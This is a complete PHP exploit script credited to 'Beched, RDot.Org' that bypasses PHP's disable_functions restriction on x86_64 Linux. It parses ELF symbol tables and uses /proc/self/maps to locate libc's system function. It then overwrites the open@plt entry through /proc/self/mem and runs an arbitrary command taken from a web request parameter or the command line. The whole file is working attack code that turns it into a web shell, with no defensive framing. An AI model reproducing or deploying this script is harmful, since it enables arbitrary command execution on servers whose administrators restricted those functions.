<?php

/*

$libc_ver:

beched@linuxoid ~ $ php -r 'readfile("/proc/self/maps");' | grep libc
7f3dfa609000-7f3dfa7c4000 r-xp 00000000 08:01 9831386                    /lib/x86_64-linux-gnu/libc-2.19.so

$open_php:

beched@linuxoid ~ $ objdump -R /usr/bin/php | grep '\sopen$'
0000000000e94998 R_X86_64_JUMP_SLOT  open

$system_offset and $open_offset:

beched@linuxoid ~ $ readelf -s /lib/x86_64-linux-gnu/libc-2.19.so | egrep "\s(system|open)@@"
  1337: 0000000000046530    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
  1679: 00000000000ec150    90 FUNC    WEAK   DEFAULT   12 open@@GLIBC_2.2.5

*/

function packlli($value) {
	$higher = ($value & 0xffffffff00000000) >> 32;
	$lower = $value & 0x00000000ffffffff;
	return pack('V2', $lower, $higher);
}

function unp($value) {
	return hexdec(bin2hex(strrev($value)));
}

function parseelf($bin_ver, $rela = false) {
	$bin = file_get_contents($bin_ver);
	$e_shoff = unp(substr($bin, 0x28, 8));
	$e_shentsize = unp(substr($bin, 0x3a, 2));
	$e_shnum = unp(substr($bin, 0x3c, 2));
	$e_shstrndx = unp(substr($bin, 0x3e, 2));

	for($i = 0; $i < $e_shnum; $i += 1) {
		$sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
		if($sh_type == 11) { // SHT_DYNSYM
			$dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
			$dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
			$dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
		}
		elseif(!isset($strtab_off) && $sh_type == 3) { // SHT_STRTAB
			$strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
			$strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
		}
		elseif($rela && $sh_type == 4) { // SHT_RELA
			$relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
			$relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
			$relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
		}
	}

	if($rela) {
		for($i = $relaplt_off; $i < $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
			$r_offset = unp(substr($bin, $i, 8));
			$r_info = unp(substr($bin, $i + 8, 8)) >> 32;
			$name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
			$name = '';
			$j = $strtab_off + $name_off - 1;
			while($bin[++$j] != "\0") {
				$name .= $bin[$j];
			}
			if($name == 'open') {
				return $r_offset;
			}
		}
	}
	else {
		for($i = $dynsym_off; $i < $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
			$name_off = unp(substr($bin, $i, 4));
			$name = '';
			$j = $strtab_off + $name_off - 1;
			while($bin[++$j] != "\0") {
				$name .= $bin[$j];
			}
			if($name == '__libc_system') {
				$system_offset = unp(substr($bin, $i + 8, 8));
			}
			if($name == '__open') {
				$open_offset = unp(substr($bin, $i + 8, 8));
			}
		}
		return array($system_offset, $open_offset);
	}
}

$debug = 1;
function get_bases() {
    $maps = file_get_contents('/proc/self/maps');
    if ($GLOBALS['debug'])
        echo $maps;

    preg_match('/^([0-9a-f]+)-[0-9a-f]+ [rwxp\-]+ [0-9a-f]+ [0-9a-f:]+ [0-9a-f]+.+?php[0-9\.]*\s*$/im', $maps, $matches);

    $php_base = hexdec($matches[1]);
    if ($GLOBALS['debug'])
        echo "php elf base: 0x" . dechex($php_base) . "\n";

    preg_match('/^([0-9a-f]+)-[0-9a-f]+ [rwxp\-]+ [0-9a-f]+ [0-9a-f:]+ [0-9a-f]+.+?libc-[0-9\.]+?\.so\s*$/im', $maps, $matches);
    $libc_base = hexdec($matches[1]);
    if ($GLOBALS['debug'])
        echo "libc base: 0x" . dechex($libc_base) . "\n";

    return array('php' => $php_base, 'libc' => $libc_base);
}

$bases = get_bases();

echo "[*] PHP disable_functions procfs bypass (coded by Beched, RDot.Org)\n";
if(strpos(php_uname('a'), 'x86_64') === false) {
	echo "[-] This exploit is for x64 Linux. Exiting\n";
	exit;
}
if(substr(php_uname('r'), 0, 4) < 2.98) {
	echo "[-] Too old kernel (< 2.98). Might not work\n";
}
echo "[*] Trying to get open@plt offset in PHP binary\n";
$open_php = parseelf('/proc/self/exe', true) + $bases['php'];
if($open_php == 0) {
	echo "[-] Failed. Exiting\n";
	exit;
}
echo '[+] Offset is 0x' . dechex($open_php) . "\n";
$maps = file_get_contents('/proc/self/maps');
preg_match('#\s+(/.+libc\-.+)#', $maps, $r);
echo "[*] Libc location: $r[1]\n";
echo "[*] Trying to get open and system symbols from Libc\n";
list($system_offset, $open_offset) = parseelf($r[1]);
if($system_offset == 0 or $open_offset == 0) {
	echo "[-] Failed. Exiting\n";
	exit;
}
echo "[+] Got them. Seeking for address in memory\n";
$mem = fopen('/proc/self/mem', 'rb');
fseek($mem, $open_php);
$open_addr = unp(fread($mem, 8));
echo '[*] open@plt addr: 0x' . dechex($open_addr) . "\n";
$libc_start = $bases['libc'];
$system_addr = $libc_start + $system_offset;
echo '[*] system@plt addr: 0x' . dechex($system_addr) . "\n";
echo "[*] Rewriting open@plt address\n";
$mem = fopen('/proc/self/mem', 'r+b');
fseek($mem, $open_php);

$cmd = isset($_REQUEST['cmd'])? $_REQUEST['cmd']: $argv[1]; 

if(fwrite($mem, packlli($system_addr))) {
	echo "[+] Address written. Executing cmd\n";
	fopen($cmd, 'r');
	
	fseek($mem, $open_php);
	fwrite($mem, packlli($open_addr));
	exit;
}
echo "[-] Write failed. Exiting\n";

